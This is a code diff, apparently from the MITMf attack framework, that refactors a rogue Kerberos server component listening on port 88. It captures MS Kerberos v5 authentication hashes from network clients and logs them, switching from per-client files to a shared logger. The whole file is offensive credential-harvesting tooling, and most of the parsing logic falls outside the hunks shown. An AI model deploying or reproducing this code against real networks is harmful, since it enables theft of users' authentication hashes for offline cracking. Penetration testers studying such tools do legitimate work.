@@ -1,35 +1,37 @@
-##################################################################################
-#Kerberos Server stuff starts here
-##################################################################################
+
+import socket
+import threading
+import struct
+import logging
+
+from SocketServer import UDPServer, TCPServer, ThreadingMixIn, BaseRequestHandler
+
+mitmf_logger = logging.getLogger("mitmf")
 
 class KERBServer():
 
-	def serve_thread_udp(host, port, handler):
+	def serve_thread_udp(self, host, port, handler):
 		try:
 			server = ThreadingUDPServer((host, port), handler)
 			server.serve_forever()
 		except Exception, e:
-			print "Error starting UDP server on port %s: %s:" % (str(port),str(e))
+			mitmf_logger.debug("[KERBServer] Error starting UDP server on port 88: {}:".format(e))
 
-	def serve_thread_tcp(host, port, handler):
+	def serve_thread_tcp(self, host, port, handler):
 		try:
 			server = ThreadingTCPServer((host, port), handler)
 			server.serve_forever()
 		except Exception, e:
-			print "Error starting TCP server on port %s: %s:" % (str(port),str(e))
+			mitmf_logger.debug("[KERBServer] Error starting TCP server on port 88: {}:".format(e))
 
 	#Function name self-explanatory
-	def start(Krb_On_Off):
-		if Krb_On_Off == "ON":
-			t1 = threading.Thread(name="KerbUDP", target=serve_thread_udp, args=("0.0.0.0", 88,KerbUDP))
-			t2 = threading.Thread(name="KerbTCP", target=serve_thread_tcp, args=("0.0.0.0", 88, KerbTCP))
-			for t in [t1,t2]:
-				t.setDaemon(True)
-				t.start()
-
-			return t1, t2
-		if Krb_On_Off == "OFF":
-			return False
+	def start(self):
+		mitmf_logger.debug("[KERBServer] online")
+		t1 = threading.Thread(name="KERBServerUDP", target=self.serve_thread_udp, args=("0.0.0.0", 88,KerbUDP))
+		t2 = threading.Thread(name="KERBServerTCP", target=self.serve_thread_tcp, args=("0.0.0.0", 88, KerbTCP))
+		for t in [t1,t2]:
+			t.setDaemon(True)
+			t.start()
 
 class ThreadingUDPServer(ThreadingMixIn, UDPServer):
 
@@ -44,6 +46,28 @@ class ThreadingTCPServer(ThreadingMixIn, TCPServer):
 
 	def server_bind(self):
 		TCPServer.server_bind(self)
+
+class KerbTCP(BaseRequestHandler):
+
+	def handle(self):
+		try:
+			data = self.request.recv(1024)
+			KerbHash = ParseMSKerbv5TCP(data)
+			if KerbHash:
+				mitmf_logger.info('[KERBServer] MSKerbv5 complete hash is: {}'.format(KerbHash))
+		except Exception:
+			raise
+
+class KerbUDP(BaseRequestHandler):
+
+	def handle(self):
+		try:
+			data, soc = self.request
+			KerbHash = ParseMSKerbv5UDP(data)
+			if KerbHash:
+				mitmf_logger.info('[KERBServer] MSKerbv5 complete hash is: {}'.format(KerbHash))
+		except Exception:
+			raise
 
 def ParseMSKerbv5TCP(Data):
 	MsgType = Data[21:22]
@@ -131,33 +155,3 @@ def ParseMSKerbv5UDP(Data):
 			return BuildHash
 	else:
 		return False
-
-class KerbTCP(BaseRequestHandler):
-
-	def handle(self):
-		try:
-			data = self.request.recv(1024)
-			KerbHash = ParseMSKerbv5TCP(data)
-			if KerbHash:
-				Outfile = "./logs/responder/MSKerberos-Client-"+self.client_address[0]+".txt"
-				WriteData(Outfile,KerbHash, KerbHash)
-				responder_logger.info('[+]MSKerbv5 complete hash is :%s'%(KerbHash))
-		except Exception:
-			raise
-
-class KerbUDP(BaseRequestHandler):
-
-	def handle(self):
-		try:
-			data, soc = self.request
-			KerbHash = ParseMSKerbv5UDP(data)
-			if KerbHash:
-				Outfile = "./logs/responder/MSKerberos-Client-"+self.client_address[0]+".txt"
-				WriteData(Outfile,KerbHash, KerbHash)
-				responder_logger.info('[+]MSKerbv5 complete hash is :%s'%(KerbHash))
-		except Exception:
-			raise
-
-##################################################################################
-#Kerberos Server stuff ends here
-##################################################################################
